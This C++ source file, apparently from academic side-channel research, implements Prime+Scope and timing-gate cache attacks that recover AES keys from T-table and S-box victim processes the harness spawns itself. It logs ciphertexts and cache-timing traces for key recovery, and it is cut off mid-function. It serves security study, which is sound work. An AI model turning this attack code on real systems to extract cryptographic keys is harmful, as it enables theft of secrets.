#include <stdint.h>
#include <assert.h>
#include <string.h>
#include <linux/mman.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>

#undef _GNU_SOURCE
#define _GNU_SOURCE
#include <sched.h>

#include "util.h"
#include "consts.h"
#include "measure/measure.h"
#include "gates/gates.h"
#include "gates/classic_bt_gates.h"
#include "gates/gates_common.h"
#include "ev/ev.h"
#include "ev/assisted_ev.h"
#include "primescope/primescope.h"
#include "aes.h"
#include "aes_attack.h"
using namespace gates;
using namespace prime_scope;

static uintptr_t map_private_anon(size_t size, int extra_flags = 0) {
	uintptr_t m = (uintptr_t) mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | extra_flags, -1, 0);
	assert(m != (uintptr_t) MAP_FAILED);
	return m;
}

static pid_t setup_separate_victim(const char* path, int affinity) {
	pid_t child_pid = fork();
	if(child_pid != 0) return child_pid;

	prctl(PR_SET_PDEATHSIG, SIGKILL);
	setaffinity(affinity);

	const char* argv[] = {path, NULL};
	execv(argv[0], const_cast<char * const *>(argv));
	perror("AES Victim execv failed!");
	exit(1);
}

// Target eviction set, trace, attack data, id
typedef void(*attacker_fn_t)(ev::EvictionSet, volatile AESAttackData*, int);

static pid_t setup_attacker(attacker_fn_t attacker, ev::EvictionSet evset, volatile AESAttackData* adata, int id, int affinity) {
	pid_t child_pid = fork();
	if(child_pid != 0) return child_pid;

	prctl(PR_SET_PDEATHSIG, SIGKILL);
	setaffinity(affinity);

	attacker(evset, adata, id);
	exit(0);
}

struct AttackSetup {
	pid_t children[3];
	volatile AESAttackData* adata;
};
static AttackSetup setup_attack(const char* victim_binary, attacker_fn_t attacker, int table_cacheline) {
	// Create shared memory with victim and attackers
	int shm = shm_open(AES_BREAK_SHM_NAME, O_RDWR | O_CREAT | O_TRUNC, 0666);
	assert(shm >= 0);
	ftruncate(shm, 2*PAGE_SIZE_ + sizeof(AESAttackData));

	// Simulate shared library memory:
	// page1 is the shared code, which detects start of decryption,
	// page2 is the shared tables
	uintptr_t page1 = map_shm(shm, PAGE_SIZE_, 0);
	uintptr_t page2 = map_shm(shm, PAGE_SIZE_, PAGE_SIZE_);

	// Shared memory for coordination of attack
	volatile AESAttackData* adata = (volatile AESAttackData*) map_shm(shm, sizeof(AESAttackData), 2*PAGE_SIZE_);
	adata->start_signal = false;
	adata->victim_status = ProcessStatus::Prep;
	adata->attacker_status[0] = ProcessStatus::Prep;
	adata->attacker_status[1] = ProcessStatus::Prep;
	for(int i = 0; i < TRACE_LENGTH; i++) {
		adata->attacker_trace[0][i] = false;
		adata->attacker_trace[1][i] = false;
	}

	// The cache lines monitored by the attackers
	// uintptr_t input1 = page1 + PAGE1_CACHELINE * CACHE_LINE_SIZE;
	uintptr_t input1 = page2 + table_cacheline * CACHE_LINE_SIZE + 3*CACHE_LINE_SIZE;
	uintptr_t input2 = page2 + table_cacheline * CACHE_LINE_SIZE;

	// Force mapping to happen now
	uintptr_t trash = READ(input1) + READ(input2);
	create_fake_dependency(trash);
	memory_fences();

	// Generate eviction sets for targets
	ev::AssistedEvictionSetManager ev_manager;
	ev::EvictionSet* evset1 = ev_manager.reduce_eviction_set(input1);
	ev::EvictionSet* evset2 = ev_manager.reduce_eviction_set(input2);
	if(evset1 == nullptr || evset2 == nullptr) {
		fprintf(stderr, "Failed to find eviction sets (ev1=%d ev2=%d)\n", evset1 != nullptr, evset2 != nullptr);
		exit(1);
	}
	// Our code expects the monitored line to contain the value zero
	*(uint64_t*)evset1[0].arr[0] = 0;
	*(uint64_t*)evset2[0].arr[0] = 0;

	// Setup victim (affinity 1)
	pid_t victim_pid = setup_separate_victim(victim_binary, 1);

	// Setup attackers (affinities 2, 3)
	pid_t attacker1_pid = setup_attacker(attacker, evset1[0], adata, 0, 2);
	pid_t attacker2_pid = setup_attacker(attacker, evset2[0], adata, 1, 3);

	// Set our own affinity to 0
	setaffinity(0);

	AttackSetup ret = {
		.children = {victim_pid, attacker1_pid, attacker2_pid},
		.adata = adata,
	};
	return ret;
}

struct AttackSetupPP {
	pid_t victim;
	volatile AESAttackData* adata;
	ev::EvictionSet sets[64];
};
static AttackSetupPP setup_prime_probe_attack(const char* victim_binary) {
	// Create shared memory with victim
	int shm = shm_open(AES_BREAK_SHM_NAME, O_RDWR | O_CREAT | O_TRUNC, 0666);
	assert(shm >= 0);
	ftruncate(shm, 2*PAGE_SIZE_ + sizeof(AESAttackData));

	// Simulate shared tables memory:
	// page1 is the shared code, which detects start of decryption,
	// page2 is the shared tables
	uintptr_t page1 = map_shm(shm, PAGE_SIZE_, 0);
	uintptr_t page2 = map_shm(shm, PAGE_SIZE_, PAGE_SIZE_);

	// Shared memory for coordination of attack
	volatile AESAttackData* adata = (volatile AESAttackData*) map_shm(shm, sizeof(AESAttackData), 2*PAGE_SIZE_);
	adata->start_signal = false;
	adata->victim_status = ProcessStatus::Prep;

	// Force mapping to happen now
	uintptr_t trash = READ(page2);
	create_fake_dependency(trash);
	memory_fences();

	AttackSetupPP ret = {0};
	ret.adata = adata;

	// Generate eviction sets for targets
	ev::AssistedEvictionSetManager ev_manager;
	for(int i = 0; i < 64; i++) {
		ev::EvictionSet* evset = ev_manager.reduce_eviction_set(page2 + (i * CACHE_LINE_SIZE));
		if(evset == nullptr) {
			fprintf(stderr, "Failed to find eviction sets (i=%d)\n", i);
			exit(1);
		}

		// setup linked list
		for(int i = 0; i < LLC_CACHE_ASSOCIATIVITY; i++) {
			*((uintptr_t*)evset[0].arr[i]) = evset[0].arr[(i + 1)%LLC_CACHE_ASSOCIATIVITY];
		}

		ret.sets[i] = evset[0];
	}

	// Setup victim (affinity 1)
	ret.victim = setup_separate_victim(victim_binary, 1);

	// Set our own affinity to 0
	setaffinity(0);
	return ret;
}

#define WAIT_VICTIM(adata, stat) \
	while(adata->victim_status != stat) {}
#define WAIT_ATTACKERS(adata, stat) \
	while(adata->attacker_status[0] != stat) {} \
	while(adata->attacker_status[1] != stat) {}
#define WAIT_STATUS(adata, stat) \
	WAIT_VICTIM(adata, stat); \
	WAIT_ATTACKERS(adata, stat);

struct SingleAttackResult {
	int attacker1;
	int attacker2;
};
static SingleAttackResult perform_single_attack(volatile AESAttackData* adata) {
	// Wait for victim and attackers to be ready
	WAIT_STATUS(adata, ProcessStatus::Ready);

	memory_fences();

	// Start the attack
	adata->start_signal = true;

	memory_fences();

	// Wait for victim and attackers to finish
	WAIT_STATUS(adata, ProcessStatus::Finished);

	memory_fences();
	
	// Reset signal
	adata->start_signal = false;

	memory_fences();

	// Reset status
	adata->victim_status = ProcessStatus::Prep;
	adata->attacker_status[0] = ProcessStatus::Prep;
	adata->attacker_status[1] = ProcessStatus::Prep;

	memory_fences();

	int a1 = -1;
	int a2 = -1;
	for(int i = 0; i < TRACE_LENGTH / 10; i++) {
		for(int j = 9; j >= 0; j--) {
			int idx = (i*10) + j;
			if((a1 == -1) && adata->attacker_trace[0][idx]) {
				a1 = idx;
			}
			if((a2 == -1) && adata->attacker_trace[1][idx]) {
				a2 = idx;
			}

			adata->attacker_trace[0][idx] = false;
			adata->attacker_trace[1][idx] = false;
		}
	}

	return SingleAttackResult {
		.attacker1 = a1,
		.attacker2 = a2,
	};
}

static void set_victim_key(volatile AESAttackData* adata, uint8_t* key, int size) {
	for(int i = 0; i < size; i++) {
		adata->next_key[i] = key[i];
	}

	memory_fences();

	adata->victim_status = ProcessStatus::CopyKey;

	memory_fences();

	WAIT_VICTIM(adata, ProcessStatus::GotKey);

	memory_fences();
}

static void fs_ps_attacker(ev::EvictionSet evset, volatile AESAttackData* adata, int id) {
	// Grab this attacker's relevant fields
	volatile ProcessStatus* status = adata->attacker_status + id;
	volatile bool* trace = adata->attacker_trace[id];

	// To prevent compiler optimization
	uintptr_t trash = evset.arr[0];

	// Trace data micro-architecturally stored here
	uintptr_t work_area = map_private_anon(PAGE_SIZE_ * TRACE_LENGTH, MAP_HUGETLB | MAP_HUGE_2MB);

	// Force mapping now
	memset((void*)work_area, 0, PAGE_SIZE_ * TRACE_LENGTH);

	// Setup pseudo-random access pattern to prevent trigerring of prefetchers
	constexpr int dcls_per_page = PAGE_SIZE_/DOUBLE_CACHE_LINE_SIZE;
	uintptr_t outputs[TRACE_LENGTH];
	for(int i = 0; i < TRACE_LENGTH; i++) {
		outputs[i] = work_area + (((13 * i) % TRACE_LENGTH) * PAGE_SIZE_) + (((7 * i) % dcls_per_page) * DOUBLE_CACHE_LINE_SIZE);
	}


	measure::Measure<measure::t_RDTSC> rdtsc_measure;

	static GateBank __attribute__((aligned(128))) bank = { 0 };
	bank.inputs[0] = evset.arr[0];

	while(true) {
		// Flush work area
		for(int j = 0; j < TRACE_LENGTH; j++) {
			for(int i = 0; i < PAGE_SIZE_ / CACHE_LINE_SIZE; i++) {
				clflush((void*) (work_area + (i*CACHE_LINE_SIZE) + (j*PAGE_SIZE_)));
			}
		}

		memory_fences();

		// Prime+Scope: Prime pattern
		trash = optimal_prime_pat.access(evset, trash);

		memory_fences();
		*status = ProcessStatus::Ready;

		// Wait for the start signal
		while(!adata->start_signal) {}
		memory_fences();

		// Run gate
		uint64_t time = rdtsc_measure.measure([&](uint64_t &trash_) {
			uintptr_t trash = trash_;

			#pragma clang loop unroll(full)
			for(int i = 0; i < TRACE_LENGTH / 10; i++) {
				for(int j = 0; j < 10; j++) {
					bank.outputs[j] = outputs[i*10 + j];
				}
				trash = ret_inv_window_gate->apply(&bank, trash);
			}

			trash_ = trash;
		}, trash);

		memory_fences();

		// Measure the resulting trace
		for(int j = 0; j < TRACE_LENGTH; j++) {
			uint64_t time = rdtsc_measure.measure(outputs[j], trash);
			TEMPORAL_ADD(trash, time);
			trace[j] = rdtsc_measure.in_cache(time);
		}

		memory_fences();
		*status = ProcessStatus::Finished;

		memory_fences();
		while(*status != ProcessStatus::Prep) {};
		memory_fences();
	}
}

static void ps_attacker(ev::EvictionSet evset, volatile AESAttackData* adata, int id) {
	// Grab this attacker's relevant fields
	volatile ProcessStatus* status = adata->attacker_status + id;
	volatile bool* trace = adata->attacker_trace[id];

	// To prevent compiler optimization
	uintptr_t trash = evset.arr[0];

	measure::Measure<measure::t_RDTSC> rdtsc_measure;

	while(true) {
		// Prime+Scope: Prime pattern
		trash = optimal_prime_pat.access(evset, trash);

		memory_fences();
		*status = ProcessStatus::Ready;

		// Wait for the start signal
		while(!adata->start_signal) {}
		memory_fences();

		#pragma clang loop unroll(full)
		for(int i = 0; i < TRACE_LENGTH; i++) {
			uint64_t t = rdtsc_measure.measure(evset.arr[0], trash);
			trace[i] = !rdtsc_measure.in_cache(t);
		}
		memory_fences();
		*status = ProcessStatus::Finished;

		memory_fences();
		while(*status != ProcessStatus::Prep) {};
		memory_fences();
	}
}

static void ps_opt_attacker(ev::EvictionSet evset, volatile AESAttackData* adata, int id) {
	// Grab this attacker's relevant fields
	volatile ProcessStatus* status = adata->attacker_status + id;
	volatile bool* trace = adata->attacker_trace[id];

	// To prevent compiler optimization
	uintptr_t trash = evset.arr[0];

	measure::Measure<measure::t_RDTSC> rdtsc_measure;

	while(true) {
		// Prime+Scope: Prime pattern
		trash = optimal_prime_pat.access(evset, trash);

		memory_fences();
		*status = ProcessStatus::Ready;

		// Wait for the start signal
		while(!adata->start_signal) {}
		memory_fences();

		uint64_t last_time = measure::rdtscp_strong();

		#pragma clang loop unroll(full)
		for(int i = 0; i < TRACE_LENGTH; i++) {
			create_fake_dependency(READ(evset.arr[0]));

			uint64_t new_time = measure::rdtscp_strong();

			trace[i] = (new_time - last_time) > RDTSC_THRESHOLD;
			last_time = new_time;
		}
		memory_fences();
		*status = ProcessStatus::Finished;

		memory_fences();
		while(*status != ProcessStatus::Prep) {};
		memory_fences();
	}
}

static int __always_inline compute_true_sample(int s) {
	return (s % 10) + ((s / 10) * 20);
}

struct SingleRetry {
	size_t tries;
	int res;
};
static SingleRetry perform_attack_single_ct(volatile AESAttackData* adata, uint8_t ct[16], const int min_diff, bool ac) {
	memory_fences();
	for(int i = 0; i < 16; i++) {
		adata->next_ciphertext[i] = ct[i];
	}

	size_t tries = 0;
	while(true) {
		tries++;

		memory_fences();

		adata->victim_status = ProcessStatus::CopyCiphertext;

		memory_fences();

		auto res = perform_single_attack(adata);
		int a1 = res.attacker1;
		int a2 = res.attacker2;
		if(a1 == -1 || a2 == -1 || (a2 - a1 < min_diff) || (ac && ((a1 % 10 == 0) || (a2 % 10 == 0)))) {
			if(tries < 50)
				continue;
		}

		a1 = compute_true_sample(a1);
		a2 = compute_true_sample(a2);
		return {.tries=tries, .res=(a2 - a1)};
	}
}

template<typename gen_ct_fn_t>
static void perform_attack_multiple_ct(volatile AESAttackData* adata, int count, gen_ct_fn_t gen_ct, FILE* out, const char* prefix) {

	auto ciphertexts = new uint8_t[count][16];
	int* attacker1 = new int[count];
	int* attacker2 = new int[count];

	uint8_t input[16];
	for(int t = 0; t < count; t++) {
		memory_fences();

		gen_ct(t, input);
		for(int i = 0; i < 16; i++) {
			adata->next_ciphertext[i] = input[i];
			ciphertexts[t][i] = input[i];
		}

		memory_fences();

		adata->victim_status = ProcessStatus::CopyCiphertext;

		memory_fences();

		auto res = perform_single_attack(adata);
		attacker1[t] = res.attacker1;
		attacker2[t] = res.attacker2;

		memory_fences();
	}

	for(int t = 0; t < count; t++) {
		fprintf(out, "%s", prefix);
		for(int i = 0; i < 16; i++) {
			fprintf(out, "%02x", ciphertexts[t][i]);
		}
		fprintf(out, ",%d,%d\n", attacker1[t], attacker2[t]);
	}

	delete[] ciphertexts;
	delete[] attacker1;
	delete[] attacker2;
}

template<typename gen_ct_fn_t>
static int perform_attack_multiple_ct_retry(volatile AESAttackData* adata, int count, gen_ct_fn_t gen_ct, FILE* out, const char* prefix) {

	auto ciphertexts = new uint8_t[count][16];
	int* attacker1 = new int[count];
	int* attacker2 = new int[count];

	uint8_t input[16];
	int total_tries = 0;
	for(int t = 0; t < count; t++) {
		memory_fences();

		gen_ct(t, input);
		for(int i = 0; i < 16; i++) {
			adata->next_ciphertext[i] = input[i];
			ciphertexts[t][i] = input[i];
		}

		int retry_count = 1;
		while(true) {
			memory_fences();

			adata->victim_status = ProcessStatus::CopyCiphertext;

			memory_fences();

			auto res = perform_single_attack(adata);
			int a1 = res.attacker1;
			int a2 = res.attacker2;
			if(a1 == -1 || a2 == -1 || (a2 - a1 < 12) || (a1 % 10 == 0) || (a2 % 10 == 0)) {
				if(retry_count < 50) {
					retry_count++;
					continue;
				}
			}
			attacker1[t] = a1;
			attacker2[t] = a2;
			break;
		}
		total_tries += retry_count;

		memory_fences();
	}

	for(int t = 0; t < count; t++) {
		fprintf(out, "%s", prefix);
		for(int i = 0; i < 16; i++) {
			fprintf(out, "%02x", ciphertexts[t][i]);
		}
		fprintf(out, ",%d,%d\n", attacker1[t], attacker2[t]);
	}

	delete[] ciphertexts;
	delete[] attacker1;
	delete[] attacker2;

	return total_tries;
}

static void perform_attack_random_ct(volatile AESAttackData* adata, int count, FILE* out, const char* prefix) {
	perform_attack_multiple_ct(adata, count, [](int, uint8_t* input) {
		for(int i = 0; i < 16; i++) {
			input[i] = rand() % 256;
		}
	}, out, prefix);
}

static void perform_attack_random_ct_round(volatile AESAttackData* adata, int count, FILE* out, int round, int line) {
	uint8_t key[16];
	tobinary("99696f874385da79659bf0294f365347", key);
	AES_KEY aeskey;
	private_AES_set_decrypt_key(key, 128, &aeskey);
	perform_attack_multiple_ct(adata, count, [round, line, &aeskey](int, uint8_t* input) {
		generate_example_ct_ttable(&aeskey, input, round, line / 16, line % 16);
	}, out, "");
}

static void perform_attack_random_ct_round_sbox(volatile AESAttackData* adata, int count, FILE* out, int round, int line) {
	uint8_t key[16];
	tobinary("99696f874385da79659bf0294f365347", key);
	AES_KEY aeskey;
	AES_set_decrypt_key_sbox(key, 128, &aeskey);
	perform_attack_multiple_ct(adata, count, [round, line, &aeskey](int, uint8_t* input) {
		generate_example_ct_sbox(&aeskey, input, round, line);
	}, out, "");
}

static void perform_attack_random_ct_round_sbox_key(volatile AESAttackData* adata, int count, FILE* out, int round, int line, uint8_t key[16], char* prefix) {
	AES_KEY aeskey;
	AES_set_decrypt_key_sbox(key, 128, &aeskey);
	perform_attack_multiple_ct(adata, count, [round, line, &aeskey](int, uint8_t* input) {
		generate_example_ct_sbox(&aeskey, input, round, line);
	}, out, prefix);
}
static void perform_attack_random_ct_round_sbox_key_ge(volatile AESAttackData* adata, int count, FILE* out, int round, int line, uint8_t key[16], char* prefix) {
	AES_KEY aeskey;
	AES_set_decrypt_key_sbox(key, 128, &aeskey);
	perform_attack_multiple_ct(adata, count, [round, line, &aeskey](int, uint8_t* input) {
		generate_example_ct_sbox_ge(&aeskey, input, round, line);
	}, out, prefix);
}

static void parse_attack_cmdline(int argc, char* argv[], const char** victim_binary, int* start_phase, int* test_count,
	int* target_line, const char** out_file) {
	int opt;
	while ((opt = getopt(argc, argv, "v:i:t:l:o:h")) != -1) {
		switch (opt) {
		case 'v':
			*victim_binary = strdup(optarg);
			break;
		case 'i':
			*start_phase = atoi(optarg);
			break;
		case 't':
			*test_count = atoi(optarg);
			break;
		case 'l':
			*target_line = atoi(optarg);
			break;
		case 'o':
			*out_file = strdup(optarg);
			break;
		case 'h':
			printf("Usage: %s %s [-v] [victim binary] [-i] [start phase] [-t] [test count] -l [target line]\n", argv[0], argv[1]);
		default:
			exit(EXIT_FAILURE);
		}
	}
}


/*
Output Format: n traces (one on each line), where each trace is [ciphertext,a1,a2].
	a1 and a2 are the attacker's results, or -1 if no event was found.
*/
static int test_aes_break_graph(int argc, char *argv[]) {
	const char* victim_binary = "./build/aes_ttable_victim";
	int start_phase = 9;
	int test_count = 10'000;
	int target_line = 16;
	const char* out_file = "attack_out.log";
	parse_attack_cmdline(argc, argv, &victim_binary, &start_phase, &test_count, &target_line, &out_file);

	auto setup_res = setup_attack(victim_binary, fs_ps_attacker, target_line);
	// auto setup_res = setup_attack(victim_binary, ps_attacker, target_line);

	for(int rep = 0; rep < 5; rep++) {
		for(int phase = 7; phase < 19; phase++) {
			for(int r = 0; r < 4; r++) {
				printf("Running %d tests (rep=%d phase=%d round=%d):\n", test_count, rep, phase, r);
				char fname[256];
				snprintf(fname, sizeof(fname), "attack_result/attack_%d_%d_%d.log", phase, rep, r);
				FILE* fout = fopen(fname, "w");

				setup_res.adata->start_phase = phase;

				perform_attack_random_ct_round(setup_res.adata, test_count, fout, r, target_line);

				fclose(fout);
			}
		}
	}

	cleanup_child(setup_res.children[0]);
	cleanup_child(setup_res.children[1]);
	cleanup_child(setup_res.children[2]);
	return 0;
}

/*
Output Format: n traces (one on each line), where each trace is [ciphertext,a1,a2].
	a1 and a2 are the attacker's results, or -1 if no event was found.
*/
static int test_aes_break_random_ct(int argc, char *argv[]) {
	const char* victim_binary = "./build/aes_ttable_victim";
	int start_phase = 9;
	int test_count = 10'000;
	int target_line = 16;
	const char* out_file = "attack_out.log";
	parse_attack_cmdline(argc, argv, &victim_binary, &start_phase, &test_count, &target_line, &out_file);

	auto setup_res = setup_attack(victim_binary, fs_ps_attacker, target_line);
	// auto setup_res = setup_attack(victim_binary, ps_attacker, target_line);

	for(int rep = 0; rep < 5; rep++) {
		for(int phase = 7; phase < 19; phase++) {
			printf("Running %d tests (rep=%d phase=%d):\n", test_count, rep, phase);
			char fname[256];
			snprintf(fname, sizeof(fname), "attack_result/attack_%d_%d.log", phase, rep);
			FILE* fout = fopen(fname, "w");

			setup_res.adata->start_phase = phase;

			perform_attack_random_ct(setup_res.adata, test_count, fout, "");

			fclose(fout);
		}
	}

	cleanup_child(setup_res.children[0]);
	cleanup_child(setup_res.children[1]);
	cleanup_child(setup_res.children[2]);
	return 0;
}

static int test_aes_break_random_ct_round2(int argc, char *argv[]) {
	const char* victim_binary = "./build/aes_ttable_victim";
	int start_phase = 9;
	int test_count = 10'000;
	int target_line = 16;
	const char* out_file = "attack_out.log";
	parse_attack_cmdline(argc, argv, &victim_binary, &start_phase, &test_count, &target_line, &out_file);

	auto setup_res = setup_attack(victim_binary, fs_ps_attacker, target_line);
	// auto setup_res = setup_attack(victim_binary, ps_attacker, target_line);

	constexpr uint8_t known_high_nibbles[16] = {0xd, 0x0, 0x6, 0x3, 0xc, 0xd, 0x2, 0xb, 0x8, 0x8, 0x7, 0x2, 0x9, 0x6, 0x4, 0x2};

	for(int rep = 0; rep < 5; rep++) {
		for(int phase = 7; phase < 19; phase++) {
			printf("Running %d tests (rep=%d phase=%d):\n", test_count, rep, phase);
			char fname[256];
			snprintf(fname, sizeof(fname), "attack_result/attack_%d_%d.log", phase, rep);
			FILE* fout = fopen(fname, "w");

			setup_res.adata->start_phase = phase;

			perform_attack_multiple_ct(setup_res.adata, test_count, [](int, uint8_t* input) {
				for(int i = 0; i < 16; i++) {
					while(1) {
						input[i] = rand() % 256;
						if(!(i == 1 || i == 5 || i == 9 || i == 13))
							break;
						uint8_t nibble = input[i] >> 4;
						uint8_t line = nibble ^ known_high_nibbles[i];
						if(line != 0)
							break; // Avoid first-round access to the monitored line
					}
				}
			}, fout, "");

			fclose(fout);
		}
	}

	cleanup_child(setup_res.children[0]);
	cleanup_child(setup_res.children[1]);
	cleanup_child(setup_res.children[2]);
	return 0;
}

static void test_aes_break_random_key_inner(const char* victim_binary, int start_phase, int test_count, FILE* fout, int target_line, attacker_fn_t attacker) {
	auto setup_res = setup_attack(victim_binary, attacker, target_line);
	setup_res.adata->start_phase = start_phase;
	
	uint8_t rand_key[16];

	for(int k = 0; k < 1'000; k++) {
		if(k % 10 == 0)
			printf("Keys: %d%%\n", k / 10);

		for(int i = 0; i < 16; i++) {
			rand_key[i] = rand()%256;
		}

		char key_text[64] = {0};
		char* key_str = aesToString(rand_key, sizeof(rand_key));
		strcat(key_text, key_str);
		free(key_str);
		strcat(key_text, ",");

		set_victim_key(setup_res.adata, rand_key, sizeof(rand_key));

		perform_attack_random_ct(setup_res.adata, test_count, fout, key_text);
	}

	cleanup_child(setup_res.children[0]);
	cleanup_child(setup_res.children[1]);
	cleanup_child(setup_res.children[2]);
}

/*
Output Format: n traces (one on each line), where each trace is [key,ciphertext,a1,a2].
	a1 and a2 are the attacker's results, or -1 if no event was found.
*/
static int test_aes_break_random_key(int argc, char *argv[]) {
	const char* victim_binary = "./build/aes_ttable_victim";
	int start_phase = 8;
	int test_count = 1000;
	int target_line = 16;
	const char* out_file = "attack_out.log";
	parse_attack_cmdline(argc, argv, &victim_binary, &start_phase, &test_count, &target_line, &out_file);

	{
		FILE* fout = fopen("attack_ps_opt.log", "w");
		test_aes_break_random_key_inner(victim_binary, start_phase, test_count, fout, target_line, ps_opt_attacker);
		fclose(fout);
	}

	{
		FILE* fout = fopen("attack_ps.log", "w");
		test_aes_break_random_key_inner(victim_binary, start_phase, test_count, fout, target_line, ps_attacker);
		fclose(fout);
	}

	{
		FILE* fout = fopen("attack_fs_ps.log", "w");
		test_aes_break_random_key_inner(victim_binary, start_phase, 1000, fout, target_line, fs_ps_attacker); // FIXME: 1000 SPEEDUP
		fclose(fout);
	}


	return 0;
}

/*
Output Format: n traces (one on each line), where each trace is [ciphertext,a1,a2].
	a1 and a2 are the attacker's results, or -1 if no event was found.
*/
static int test_aes_break_graph_sbox(int argc, char *argv[]) {
	const char* victim_binary = "./build/aes_sbox_victim";
	int start_phase = 9;
	int test_count = 10'000;
	int target_line = 17;
	const char* out_file = "attack_out.log";
	parse_attack_cmdline(argc, argv, &victim_binary, &start_phase, &test_count, &target_line, &out_file);

	auto setup_res = setup_attack(victim_binary, fs_ps_attacker, target_line);

	for(int rep = 0; rep < 5; rep++) {
		for(int phase = 7; phase < 19; phase++) {
			for(int r = 0; r < 3; r++) {
				printf("Running %d tests (rep=%d phase=%d round=%d):\n", test_count, rep, phase, r);
				char fname[256];
				snprintf(fname, sizeof(fname), "attack_result/attack_%d_%d_%d.log", phase, rep, r);
				FILE* fout = fopen(fname, "w");

				setup_res.adata->start_phase = phase;

				int tc = test_count;
				if(r == 2) tc = 1000;
				perform_attack_random_ct_round_sbox(setup_res.adata, tc, fout, r, 0);

				fclose(fout);
			}
		}
	}

	cleanup_child(setup_res.children[0]);
	cleanup_child(setup_res.children[1]);
	cleanup_child(setup_res.children[2]);
	return 0;
}

static int test_aes_break_random_ct_sbox(int argc, char *argv[]) {
	const char* victim_binary = "./build/aes_sbox_victim";
	int start_phase = 9;
	int test_count = 10'000;
	int target_line = 17;
	const char* out_file = "attack_out.log";
	parse_attack_cmdline(argc, argv, &victim_binary, &start_phase, &test_count, &target_line, &out_file);

	auto setup_res = setup_attack(victim_binary, fs_ps_attacker, target_line);

	for(int rep = 0; rep < 5; rep++) {
		for(int phase = 7; phase < 19; phase++) {
			printf("Running %d tests (rep=%d phase=%d):\n", test_count, rep, phase);
			char fname[256];
			snprintf(fname, sizeof(fname), "attack_result/attack_%d_%d.log", phase, rep);
			FILE* fout = fopen(fname, "w");

			setup_res.adata->start_phase = phase;

			perform_attack_random_ct(setup_res.adata, test_count, fout, "");

			fclose(fout);
		}
	}

	cleanup_child(setup_res.children[0]);
	cleanup_child(setup_res.children[1]);
	cleanup_child(setup_res.children[2]);
	return 0;
}

static int test_aes_break_random_key_sbox(int argc, char *argv[]) {
	const char* victim_binary = "./build/aes_sbox_victim";
	int start_phase = 8;
	int test_count = 10000;
	int target_line = 17;
	const char* out_file = "attack_sbox.log";
	parse_attack_cmdline(argc, argv, &victim_binary, &start_phase, &test_count, &target_line, &out_file);
		
	FILE* fout = fopen(out_file, "w");
	
	auto setup_res = setup_attack(victim_binary, fs_ps_attacker, target_line);
	setup_res.adata->start_phase = start_phase;
	
	uint8_t rand_key[16];

	for(int k = 0; k < 1'000; k++) {
		if(k % 10 == 0)
			printf("Keys: %d%%\n", k / 10);

		for(int i = 0; i < 16; i++) {
			rand_key[i] = rand()%256;
		}

		char key_text[64] = {0};
		char* key_str = aesToString(rand_key, sizeof(rand_key));
		strcat(key_text, key_str);
		free(key_str);
		strcat(key_text, ",");

		set_victim_key(setup_res.adata, rand_key, sizeof(rand_key));

		perform_attack_random_ct(setup_res.adata, test_count, fout, key_text);
	}

	fclose(fout);

	cleanup_child(setup_res.children[0]);
	cleanup_child(setup_res.children[1]);
	cleanup_child(setup_res.children[2]);

	return 0;
}

static int test_aes_break_random_key_sbox_sr_adaptive(int argc, char *argv[]) {
	const char* victim_binary = "./build/aes_sbox_victim";
	int start_phase = 12;
	int test_count = 1000;
	int target_line = 17;
	const char* out_file = "attack_sbox.log";
	parse_attack_cmdline(argc, argv, &victim_binary, &start_phase, &test_count, &target_line, &out_file);
		
	FILE* fout = fopen(out_file, "w");
	
	auto setup_res = setup_attack(victim_binary, fs_ps_attacker, target_line);
	auto adata = setup_res.adata;
	adata->start_phase = start_phase;
	
	constexpr int MIN_DIFF = 12;
	constexpr int WITNESS_THRESHOLD = 70;
	constexpr int TESTS_PER_KEY = 5;

	uint8_t rand_key[16];
	for(int k = 0; k < test_count; k++) {
		printf("Keys: %d/%d\n", k, test_count);

		for(int i = 0; i < 16; i++) {
			rand_key[i] = rand()%256;
		}

		char key_text[64] = {0};
		char* key_str = aesToString(rand_key, sizeof(rand_key));
		strcat(key_text, key_str);
		free(key_str);
		strcat(key_text, ",");

		set_victim_key(adata, rand_key, sizeof(rand_key));

		AES_KEY aeskey; // FIXME: REMVOE
		AES_set_decrypt_key_sbox(rand_key, 128, &aeskey);

		for(int i = 0; i < TESTS_PER_KEY; i++) {
			size_t trace_count = 0;
			size_t select_trace_count = 0;
			auto oracle = [adata, &trace_count](uint8_t* ct, bool ac) {
				auto res = perform_attack_single_ct(adata, ct, MIN_DIFF, ac);
				trace_count += res.tries;
				//return (res.res >= WITNESS_THRESHOLD);
				return res.res;
			};

			uint8_t ct[16];
			while(true) {
				generate_example_ct_sbox_ge(&aeskey, ct, 1, 0);
				int oracle_res_o = oracle(ct, true);
				bool oracle_res = oracle_res_o >= WITNESS_THRESHOLD;
				bool witness = first_access_round_sbox(&aeskey, ct, 0) >= 2;
				// if(witness) {
				// 	printf("Witness, oracle: %d [%d]\n", oracle_res, oracle_res_o);
				// }
				if(!oracle_res)
					continue;
				constexpr int VOTERS = 4;
				int votes = 0;
				for(int i = 0; i < VOTERS*2; i++) {
					votes += oracle(ct, true) >= WITNESS_THRESHOLD;
				}
				if(votes > VOTERS) {
					fprintf(stderr, "Oracle true, witness: %d, %d votes\n", witness, votes);
					break;
				}
			}
			select_trace_count = trace_count;

			for(int l = 0; l < 1; l++) {
				trace_count += perform_attack_multiple_ct_retry(adata, 16*64, [&ct](int t, uint8_t* input) {
					memcpy(input, ct, 16);
					int byte_idx = t/64;
					int lsb = t%64;
					input[byte_idx] = input[byte_idx] ^ lsb;
				}, fout, key_text);
			}
			fprintf(stderr, "key=%d i=%d trace_count=%lu [%lu, %lu]\n", k, i, trace_count, select_trace_count, trace_count-select_trace_count);
		}
	}

	fclose(fout);

	cleanup_child(setup_res.children[0]);
	cleanup_child(setup_res.children[1]);
	cleanup_child(setup_res.children[2]);

	return 0;
}

static int test_aes_sbox_rounds(int argc, char *argv[]) {
	const char* victim_binary = "./build/aes_sbox_victim";
	int start_phase = 8;
	int test_count = 1000;
	int target_line = 17;
	const char* out_file = "attack_sbox.log";
	parse_attack_cmdline(argc, argv, &victim_binary, &start_phase, &test_count, &target_line, &out_file);
		
	FILE* fout = fopen(out_file, "w");
	
	auto setup_res = setup_attack(victim_binary, fs_ps_attacker, target_line);
	setup_res.adata->start_phase = start_phase;
	
	uint8_t rand_key[16];

	for(int k = 0; k < 100; k++) {
		printf("Keys: %d%%\n", k);

		for(int i = 0; i < 16; i++) {
